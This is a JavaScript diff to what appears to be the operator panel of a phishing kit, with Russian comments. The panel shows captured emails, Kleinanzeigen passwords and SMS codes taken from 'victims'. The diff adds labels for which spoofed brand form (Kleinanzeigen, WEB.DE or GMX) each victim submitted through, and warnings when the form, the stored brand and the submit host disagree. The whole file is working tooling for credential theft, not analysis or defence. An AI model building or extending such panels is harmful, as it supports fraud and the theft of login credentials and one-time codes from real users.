@@ -21,6 +21,15 @@
     return div.innerHTML;
   }
 
+  /** clientFormBrand с формы жертвы (klein / webde / gmx). */
+  function humanClientFormBrand(b) {
+    var x = (b || '').toLowerCase();
+    if (x === 'klein') return 'Kleinanzeigen';
+    if (x === 'webde') return 'WEB.DE';
+    if (x === 'gmx') return 'GMX';
+    return '';
+  }
+
   /** Строка события в блоке Events (nodeName: 'li' в списке или 'div' внутри свёртки). */
   function buildDetailEventNode(ev, isLatest, nodeName) {
     var at = '';
@@ -87,7 +96,9 @@
     var lines = [];
     lines.push('=== Антифрод: все снимки лида ===');
     lines.push('leadId: ' + (d.leadId || '—'));
-    lines.push('brand: ' + (d.brand || '—'));
+    lines.push('brand (запись): ' + (d.brand || '—'));
+    lines.push('clientFormBrand (форма): ' + (humanClientFormBrand(d.clientFormBrand) || d.clientFormBrand || '—'));
+    lines.push('hostBrandAtSubmit: ' + (d.hostBrandAtSubmit || '—'));
     if (d.email) lines.push('email: ' + d.email);
     if (d.emailKl) lines.push('emailKl: ' + d.emailKl);
     lines.push('platform (в записи): ' + (d.platform || '—'));
@@ -604,6 +615,19 @@
       var pastHistoryIconHtml = lead.pastHistoryTransferred
         ? '<span class="session-past-history-icon" title="История перенесена из предыдущего лога" aria-label="История из прошлого лога"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M21 8C21 6.34315 19.6569 5 18 5H10C8.34315 5 7 6.34315 7 8V20C7 21.6569 8.34315 23 10 23H18C19.6569 23 21 21.6569 21 20V8ZM19 8C19 7.44772 18.5523 7 18 7H10C9.44772 7 9 7.44772 9 8V20C9 20.5523 9.44772 21 10 21H18C18.5523 21 19 20.5523 19 20V8Z" fill="#111111"/><path d="M6 3H16C16.5523 3 17 2.55228 17 2C17 1.44772 16.5523 1 16 1H6C4.34315 1 3 2.34315 3 4V18C3 18.5523 3.44772 19 4 19C4.55228 19 5 18.5523 5 18V4C5 3.44772 5.44772 3 6 3Z" fill="#111111"/></svg></span>'
         : '';
+      var surfMeta = '';
+      var cfbL = (lead.clientFormBrand || '').toLowerCase();
+      var rbL = (lead.brand || '').toLowerCase();
+      if (cfbL === 'klein') {
+        surfMeta = '<span class="session-form-surf" title="Submit со страницы Kleinanzeigen">Kl·форма</span>';
+      } else if (cfbL === 'webde') {
+        surfMeta = '<span class="session-form-surf" title="Submit с WEB.DE">WD·форма</span>';
+      } else if (cfbL === 'gmx') {
+        surfMeta = '<span class="session-form-surf" title="Submit с GMX">GMX·форма</span>';
+      }
+      if (cfbL && rbL && cfbL !== rbL) {
+        surfMeta += '<span class="session-form-warn" title="Форма (clientFormBrand) ≠ brand записи">!</span>';
+      }
       var chatCount = lead.chatCount != null ? lead.chatCount : 0;
       var chatHtml = chatCount > 0
         ? '<span class="session-chat" title="Сообщений в чате"><svg class="session-chat-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg><span class="session-chat-count">' + chatCount + '</span></span>'
@@ -627,6 +651,7 @@
           '</div>' +
           '<div class="session-meta-row">' +
             '<span class="action-badge ' + badge.cls + '">' + escapeHtml(badge.label) + '</span>' +
+            surfMeta +
             '<span class="session-icons-bottom">' +
               '<span class="session-icon-wrap session-icon-wrap--past">' + pastHistoryIconHtml + '</span>' +
               '<span class="session-icon-wrap session-icon-wrap--klein">' + brandIconHtml + '</span>' +
@@ -967,6 +992,39 @@
       detailPasswordKl.textContent = (lead.passwordKl || '').trim() || '—';
       detailPasswordKl.classList.add('copy-on-click');
       detailPasswordKl.title = 'Click to copy';
+    }
+    var detailSubmitForm = document.getElementById('detail-submit-form');
+    var detailSubmitHost = document.getElementById('detail-submit-host');
+    var detailRecordBrand = document.getElementById('detail-record-brand');
+    var submitWarnRow = document.getElementById('detail-submit-warn-row');
+    var submitWarnEl = document.getElementById('detail-submit-warn');
+    var cfbRaw = (lead.clientFormBrand || '').trim();
+    var hbRaw = (lead.hostBrandAtSubmit || '').trim();
+    var rbRaw = (lead.brand || '').trim();
+    if (detailSubmitForm) {
+      detailSubmitForm.textContent = humanClientFormBrand(cfbRaw) || cfbRaw || '—';
+    }
+    if (detailSubmitHost) detailSubmitHost.textContent = hbRaw || '—';
+    if (detailRecordBrand) detailRecordBrand.textContent = rbRaw || '—';
+    var cfbLo = cfbRaw.toLowerCase();
+    var rbLo = rbRaw.toLowerCase();
+    var hbLo = hbRaw.toLowerCase();
+    var wSubmit = '';
+    if (cfbLo && rbLo && cfbLo !== rbLo) {
+      wSubmit = 'Клиент прислал форму «' + cfbLo + '», в записи brand «' + rbLo + '».';
+    }
+    if (cfbLo && hbLo && cfbLo !== hbLo) {
+      wSubmit = wSubmit ? wSubmit + ' ' : '';
+      wSubmit += 'Форма и Host различаются (часто на localhost / туннеле).';
+    }
+    if (submitWarnRow && submitWarnEl) {
+      if (wSubmit) {
+        submitWarnRow.classList.remove('hidden');
+        submitWarnEl.textContent = wSubmit;
+      } else {
+        submitWarnRow.classList.add('hidden');
+        submitWarnEl.textContent = '';
+      }
     }
     var smsRow = document.getElementById('detail-sms-row');
     var smsCodeEl = document.getElementById('detail-sms-code');
